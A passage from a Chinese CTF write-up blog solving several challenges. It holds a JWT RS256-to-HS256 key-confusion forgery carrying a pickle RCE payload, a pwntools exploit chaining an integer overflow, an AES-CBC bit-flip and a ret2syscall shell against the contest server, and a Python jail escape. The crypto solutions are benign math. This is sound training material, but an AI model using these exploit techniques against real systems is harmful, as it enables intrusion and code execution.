class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.vJ1JdCFGV3vRkM1H3IF8wlFKaWVXcQbrHix3gHqvZMo&#x27;</span></span><br><span class="line">[+] Found n with multiplier 4  :</span><br><span class="line"> 0xb37cf68716c3859b948ae3bba7fadd7a63f9aa7a6f0024b36078ca45b3fb9060c8788600752ce16e4d85801d97487778f80a86909cd3af32b4c653b4c8f3026929e3332ad006ed84e6cd4de1c719276283690d6387e79597b17f3750b0d980001d57d4ffe4696775fadbba62573f3f416209ab1c0d4ffa3ed57996d8bea4a6f0fa8a6662bfccd28f085c14eac104809cad60b99a4aee22f48e8d1e39118af90fe30e6cc95b83590e67947c3c3a9a725c9a9b2476ba2786df163c995772ca47333218ac4d597756e1134d252a4b9853ea43c1e99be3c43864242f1db1b2553a0af11ebebf4f7e0e1373f4b47efea099a48faa2d231ae3c44b7db6399d08381da9</span><br><span class="line">[+] Written to b37cf68716c3859b_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.exHt20EJDDnCPtoF5H1WI80i5o7HmntbrISr9-wuZg4&#x27;</span></span><br><span class="line">[+] Written to b37cf68716c3859b_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.QejW2HaJAbmCgXQHkJxutQdYaSaFSeRnhKA3LKSyahY&#x27;</span></span><br><span class="line">================================================================================</span><br><span class="line">Here are your JWT<span class="string">&#x27;s once again for your copypasting pleasure</span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span class="string">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.Ay8GNWt_1llpI5Q8qPOt-wIs7c8AjxQZ85nc97Y0b8Y</span></span><br><span class="line"><span class="string">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.4lUi6OL8NIqdBeJ9y0s4BkV9-5twlf973KXfVuB0bXg</span></span><br><span class="line"><span class="string">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.aApemXL-HmcakktrnGr1XaUpkfaMOp4oL919wO3MJy0</span></span><br><span class="line"><span class="string">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.vJ1JdCFGV3vRkM1H3IF8wlFKaWVXcQbrHix3gHqvZMo</span></span><br><span class="line"><span class="string">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.exHt20EJDDnCPtoF5H1WI80i5o7HmntbrISr9-wuZg4</span></span><br><span class="line"><span class="string">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.QejW2HaJAbmCgXQHkJxutQdYaSaFSeRnhKA3LKSyahY</span></span><br></pre></td></tr></table></figure><p>利用 <code>/admin</code> 回显尝试出公钥是 <code>b37cf68716c3859b_65537_pkcs1.pem</code>。</p><p><code>/admin</code> 路由可通过HS256解析，尝试修改RS256为HS256，先生成pickle：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;sleep 5&#x27;)&quot;</span>,))</span><br><span class="line">poc = A()</span><br><span class="line">result = pickle.dumps(poc)</span><br><span class="line">result = base64.b64encode(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>再生成HS256的jwt：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.js</span></span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;\\b37cf68716c3859b_65537_pkcs1.pem&#x27;</span>);</span><br><span class="line"><span class="comment">// console.log(privateKey);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123;<span class="attr">username</span>: <span class="string">&quot;aaa&quot;</span>,<span class="attr">password</span>: <span class="string">&quot;08f8e0260c64418510cefb2b06eee5cd&quot;</span>,<span class="attr">is_admin</span>: <span class="literal">true</span>,<span class="attr">introduction</span>: <span class="string">&quot;gASVPgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwiX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ3NsZWVwIDUnKZSFlFKULg==&quot;</span>&#125;, cert, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br><span class="line"></span><br><span class="line"><span class="comment">// **************************// </span></span><br><span class="line"><span class="comment">// node 1.js</span></span><br><span class="line"><span class="comment">// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSIsInBhc3N3b3JkIjoiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCJpc19hZG1pbiI6dHJ1ZSwiaW50cm9kdWN0aW9uIjoiZ0FTVlBnQUFBQUFBQUFDTUNHSjFhV3gwYVc1emxJd0VaWFpoYkpTVGxJd2lYMTlwYlhCdmNuUmZYeWduYjNNbktTNXplWE4wWlcwb0ozTnNaV1Z3SURVbktaU0ZsRktVTGc9PSIsImlhdCI6MTczMDYwNDAzMH0.ro7Xyjbw5uyYmIh1TRYDpiWHKoYDtV-fEQ9yhIumzz0</span></span><br></pre></td></tr></table></figure><p>修改cookie，尝试成功触发sleep，改pickle为反弹shell代码，成功反弹shell，<code>cat /flag</code> 得到flag。</p><p>​    </p><h2 id="Reverse-Pwn"><a href="#Reverse-Pwn" class="headerlink" title="Reverse/Pwn"></a>Reverse/Pwn</h2><h3 id="WhoIsAdmin"><a href="#WhoIsAdmin" class="headerlink" title="WhoIsAdmin"></a>WhoIsAdmin</h3><blockquote><p>尝试对AcountSystem进行攻击，获取shell，拿到flag。你需要想办法让admin_login_state登录状态为1，并买下该系统，才能改系统名称哦。前置知识：Crypto：AES-CBC翻转攻击，Pwn：整数溢出、64位ret2syscall</p></blockquote><p>分析菜单的主要功能如下：</p><p>1-新建普通用户，用户名=<code>BinaryCryptoYYDS</code>，AES加密，得到密文<br>3-显示 <code>money</code><br>4-输入 <code>x</code> 计算RSA，成功后，输入 <code>y</code>，<code>money+=(-100)*y</code>，<code>LimitAcountNumber+=y</code><br>5-显示 <code>LimitAcountNumber</code><br>6-如果 <code>money&gt;50000</code>，买下系统，则 <code>buy=1</code><br>7-输入密文，AES解密得到 用户名=<code>AdminAdminAdminA</code>，则 <code>admin_login_state=1</code><br>8-满足用户是 <code>admin</code>（<code>admin_login_state == 1</code>）且买下系统（<code>buy == 1</code>）后，可以修改系统名字</p><p><strong>攻击思路</strong></p><p>先买系统，输入4，计算 <code>x</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">281443</span></span><br><span class="line">p = <span class="number">431</span></span><br><span class="line">q = <span class="number">653</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">c = <span class="number">222876</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 1640</span></span><br></pre></td></tr></table></figure><p>然后整数溢出，使 <code>money&gt;50000</code>，输入6，买下系统，<code>buy=1</code>。</p><p>下一步伪造管理员登录，输出7，cbc字节翻转攻击，满足用户名=<code>AdminAdminAdminA</code>，<code>admin_login_state=1</code>。</p><p>最后改系统名字，输入8，<code>scanf</code> 栈溢出，ret2syscall。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">24011</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># buy = 1</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;satisfied???\n&#x27;</span>,<span class="string">b&#x27;1640&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;add?\n&#x27;</span>,<span class="string">b&#x27;-500&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># admin_login_state = 1</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">m0 = <span class="string">&#x27;BinaryCryptoYYDS&#x27;</span></span><br><span class="line">m1 = <span class="string">&#x27;AdminAdminAdminA&#x27;</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;authcode: &#x27;</span>)</span><br><span class="line">c0 = r.recvline().strip().decode()</span><br><span class="line"><span class="built_in">print</span>(c0)</span><br><span class="line">c = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(c0[:<span class="number">32</span>]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    c[i] ^= (<span class="built_in">ord</span>(m0[i])^<span class="built_in">ord</span>(m1[i]))</span><br><span class="line">new_c = <span class="built_in">bytes</span>(c).<span class="built_in">hex</span>()+c0[<span class="number">32</span>:]</span><br><span class="line"><span class="built_in">print</span>(new_c)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;authcode: \n&#x27;</span>,new_c.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># change name</span></span><br><span class="line">pop_rax=<span class="number">0x40153c</span></span><br><span class="line">pop_rdi=<span class="number">0x402db3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x402db1</span></span><br><span class="line">pop_rdx=<span class="number">0x401538</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">syscall=<span class="number">0x401527</span></span><br><span class="line">AccountSystemName_addr=<span class="number">0x4052F0</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;name: &#x27;</span>)</span><br><span class="line">pl=flat([</span><br><span class="line">    <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x20</span>+<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>),</span><br><span class="line">    pop_rax,<span class="number">59</span>,</span><br><span class="line">    pop_rdi,AccountSystemName_addr,</span><br><span class="line">    pop_rsi_r15,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    pop_rdx,<span class="number">0</span>,</span><br><span class="line">    syscall</span><br><span class="line">    ])</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;PwnAndCryptoAreBothVeryInteresting&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="Misc-3"><a href="#Misc-3" class="headerlink" title="Misc"></a>Misc</h2><h3 id="hard-jail"><a href="#hard-jail" class="headerlink" title="hard_jail"></a>hard_jail</h3><blockquote><p>waf好短，看起来好简单OUO</p></blockquote><p>交互拿到源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">black=[&quot;(&quot;,&quot;)&quot;,&quot;\&#x27;&quot;,&quot;\&quot;&quot;,&quot;@&quot;]</span><br><span class="line">banner=&#x27;&#x27;&#x27; _                   _        _       _ _</span><br><span class="line">| |__   __ _ _ __ __| |      (_) __ _(_) |</span><br><span class="line">| &#x27;_ \ / _` | &#x27;__/ _` |      | |/ _` | | |</span><br><span class="line">| | | | (_| | | | (_| |      | | (_| | | |</span><br><span class="line">|_| |_|\__,_|_|  \__,_|____ _/ |\__,_|_|_|</span><br><span class="line">                     |_____|__/&#x27;&#x27;&#x27;</span><br><span class="line">print(banner)</span><br><span class="line">print(&quot;input your code or input &#x27;show&#x27; to get the source code&quot;)</span><br><span class="line">while True:</span><br><span class="line">    code = input(&quot;&gt;&gt;&quot;)</span><br><span class="line">    if code==&quot;show&quot;:</span><br><span class="line">        print(open(__file__,&quot;r&quot;).read())</span><br><span class="line">        continue</span><br><span class="line">    if not code.isascii():</span><br><span class="line">        exit(&quot;Please input ascii&quot;)</span><br><span class="line">    if len(code)&gt;50:</span><br><span class="line">        exit(&quot;code too long&quot;)</span><br><span class="line">    for word in black:</span><br><span class="line">        if word in code:</span><br><span class="line">            exit(&quot;hacker!!!!&quot;)</span><br><span class="line">    exec(code)</span><br></pre></td></tr></table></figure><p>覆盖black为空即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;black=[]</span><br><span class="line">&gt;&gt;print(__import__(&quot;os&quot;).popen(&quot;ls /home/*&quot;).read())</span><br><span class="line">&gt;&gt;print(__import__(&quot;os&quot;).popen(&quot;nl /h*/*/*&quot;).read())</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Secret-of-Starven"><a href="#Secret-of-Starven" class="headerlink" title="Secret of Starven"></a>Secret of Starven</h3><blockquote><p>有黑客进入了Starven的电脑，还偷走了他的学习资料，你能帮助他挽回尊严嘛</p></blockquote><p>SMB流量，用 <code>smb2</code> 筛选，在405提取 <code>secret.zip</code> 数据，zip爆破，密码：<code>spellorstarve</code>。</p><p>解压得到flag：<code>SYC&#123;D0n7_spre0d_St@rven&#39;s_s3crEt&#125;</code>。</p><p>​    </p><h2 id="Crypto-3"><a href="#Crypto-3" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easy-LLL"><a href="#easy-LLL" class="headerlink" title="easy_LLL"></a>easy_LLL</h3><blockquote><p>升级svp,flag前缀为SYC{xx}</p></blockquote><p>HNP问题，$a_im+b_i \equiv c_i \pmod p \Rightarrow -b_i=a_im-c_i+k_ip$，构造格，LLL求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">114770017142688382362918268558878024848633097928402093647914503696492833723966801545716194546592346338592062332306371502256979159033965343002132956304625610134374822329402499359634555710129039614275145668904822690744696925414716152630310915301980153974374009140517084226870950134327432658087834138202887501571</span></span><br><span class="line">c = [<span class="number">25269157674120082500323585451842928560404625967932662908517922704871828513397233858615005968124017428639853960550468542894270451871612496631645175015826203493265945456529848647562285359912541672751550625137876486033809099678631009005979648033707322772087110235116987698692692467320479776960630479772236446980</span>, <span class="number">75827517416784647262997004080634347924631190865715212882627791181841845414253117114184423517850773219376565782814219713490136873921446382123059696483594598328510450811390866671002685611755205236016843942407419858592870716928648777362367108239158432436307113173823883182666320180058177554647020175991566479974</span>, <span class="number">4000439731719746534404360339840675006453847582492745979982221624660296805996044239209286181541462187650487112017410839740281883027081539802479046385802021188067656190594734619927933032154534742175380783895559841318520045144113562164247717915766667365412215754183668349398802684299015216478025166881475794536</span>, <span class="number">16711257143606850336586355581909703391105580636095435863487225535083010317005439435375105800641024112138121810242207127443011036209544967633123983636015153089843815287370646565071784002098183021489882046492609441708361550786752857773565252821037805549119284258373739189052221307754872723967188683410620808193</span>, <span class="number">106512227999048988543537542345636528925594107128125030635002665980574709006558840446189017357623681828677935125012144689963798865971782914704616798239451971370511961281779438306334353650663495164449411037055054859128957955413918744183200858441122917851347996800797164614883188302584586112732819164555910532500</span>]</span><br><span class="line">a = [<span class="number">177876163920838720585474640511391249051418827853372387342635245341495792468826199544624082182728094652999191797576747605771062756630817438777653951772485569478516324903956113309190795622258346824643390004835397272889256696087356239515881459115499360779486974615331766141255410923960657795391638070660994726539</span>, <span class="number">154147211832384364492785997490497428696214843927503185938896425556028644075902949520267734189423717477702286854849502563505554965833703544305651488482204719931055591825164774932532116940955079750398001376723036214113076925445019856194390932639722726924707396244454184674407094860919513514591518499956074524561</span>, <span class="number">162236910312416448303316079284626131452444352290110477620135842885125003493068172330766174225997049094080836685617836911475638508283918576304502582848847097467251286819613975600023439985149604495163647781268904127545271241114039490048103188362740808427663167350820948490766499995036870926879430699822216419877</span>, <span class="number">156324330649465856865205652642919116551480610060830456323361514761783406613162826555066367215822747145109223530381689780625035795004458919262362420375225560790467893332585836287433463308447660726674632677063603419250881619682710122472587150879771212601074942044613408069114640355658551759306352327418458216623</span>, <span class="number">94727349364308455432706991721504607810501329870619614073375570944298709074650444442139356318854809081925625009516102978518170343525726627149123655332253529418292440747073463615106501530133930750010290051226765906194210372904323460884238665194406125116885468971886527174150462509520345910607640580833401931201</span>]</span><br><span class="line">t = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">A = a[:]</span><br><span class="line">B = [-k <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct Lattice</span></span><br><span class="line">K = <span class="number">2</span>^<span class="number">400</span>   <span class="comment"># ki &lt; 2^400</span></span><br><span class="line">X = p * identity_matrix(QQ, t) <span class="comment"># t * t</span></span><br><span class="line">Z = matrix(QQ, [<span class="number">0</span>] * t + [K/p] + [<span class="number">0</span>]).transpose() <span class="comment"># t+1 column</span></span><br><span class="line">Z2 = matrix(QQ, [<span class="number">0</span>] * (t+<span class="number">1</span>) + [K]).transpose()    <span class="comment"># t+2 column</span></span><br><span class="line"></span><br><span class="line">Y = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]]) <span class="comment"># (t+2) * t</span></span><br><span class="line">Y = block_matrix([[Y, Z, Z2]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find short vector</span></span><br><span class="line">Y = Y.LLL()</span><br><span class="line"></span><br><span class="line"><span class="comment"># check</span></span><br><span class="line">k0 = ZZ(Y[<span class="number">1</span>, <span class="number">0</span>] % p)</span><br><span class="line">x = ZZ(Y[<span class="number">1</span>, -<span class="number">2</span>] / (K/p) % p)</span><br><span class="line"><span class="keyword">assert</span>(k0 == (A[<span class="number">0</span>]*x + B[<span class="number">0</span>]) % p)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(x)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;125b-5c7b19c7-90e2-8d87c8a8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="highlow"><a href="#highlow" class="headerlink" title="highlow"></a>highlow</h3><blockquote><p>高，低位，异或，flag前缀为SYC{xx}</p></blockquote><p>flag为44位，高1024-44*8-400=272为0，低400位为0，coppersmith求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">11017336122691034053241992293963114590816319844384287448629663672049205892828600396465505710922907685545939978376321927394655458727494361852952898280905220963163625482295222856129164172619564344634365520328815972232825639292605311741655988427166811406091329613627961070231457035303298793651546412496975662225857123805867756651901374507447803198638466304862480202099076813471571495380132563252630789218173007275890600746758285415274434393381125742526014986039652677605642226576741424053749512280825231217420239089105794080707322357602941046822659335487420672699022969372037662958497832065752272061853723653365171768556</span></span><br><span class="line">n = <span class="number">14091206320622523674847720139761543154822190879035380245424481267482550932229611965964424965958386255076593911062804299275581742665134207390532802109700225140999812698020838683697375891035625255222001884477214361835101442288725383073334392995186053867261497679234362794914108033574681292656522807928680812726462195077833184018122369579002715900477290345396065912536529290811962117814900448319776590712946259540382461632468634827959957286905806432005632864663985014872365672653476822833921870071851313424903481282350342304819149894610089804321405589433980650340610521659031234826823369114800150883988613877877881069579</span></span><br><span class="line">pxor = <span class="number">124229245244085791439650934438639686782423445183921252684721764061493908790073948877623812930339081158169421854801552819088679937157357924845248082716160727839419054107753000815066526032809275137495740454967765165248115412626716101315676902716808647904092798908601183908297141420793614426863816161203796966951</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1024-44*8-400=272</span></span><br><span class="line">ph = pxor &gt;&gt; (<span class="number">44</span>*<span class="number">8</span>+<span class="number">400</span>) &lt;&lt; (<span class="number">44</span>*<span class="number">8</span>+<span class="number">400</span>)</span><br><span class="line">pl = pxor % (<span class="number">2</span>^<span class="number">400</span>)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = ph + x * <span class="number">2</span>^<span class="number">400</span> + pl</span><br><span class="line">root = f.monic().small_roots(X=<span class="number">2</span>^(<span class="number">44</span>*<span class="number">8</span>), beta=<span class="number">0.48</span>)</span><br><span class="line">p = ph + <span class="built_in">int</span>(root[<span class="number">0</span>]) * <span class="number">2</span>^<span class="number">400</span> + pl</span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;2f521b13bc9d6e932e9f5cbe511112df9e3a9c6&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Number-theory"><a href="#Number-theory" class="headerlink" title="Number theory"></a>Number theory</h3><blockquote><p>费马，flag前缀为SYC{xx}</p></blockquote><p>$h_0 \equiv (1012q + 2024)^p \pmod n \\\Rightarrow h_0 \equiv (1012q + 2024)^p \pmod q \\\Rightarrow h_0 \equiv 2024^p \pmod q \\\Rightarrow 2024^p = h_0-kq \\\Rightarrow 2024^n = (h_0-kq)^q \\\Rightarrow 2024^n=h_0^q + Kq \\\Rightarrow 2024^n \equiv h_0 \pmod q$</p><p>所以 $2024^n-h_0$，必然是 $q$ 的倍数。</p><p>$h_1=a_1p+b_1q,h_2=a_2p+b_2q \\\Rightarrow b_2h_1=a_1b_2p+b_1b_2q,b_1h_2=a_2b_1p+b_1b_2q$</p><p>相减有 $b_2h_1-b_1h_2=(a_1b_2-a_2b_1)*p$，爆破小位数的 $b_1,b_2$ 求gcd得 $p$。</p><figure class="highlight 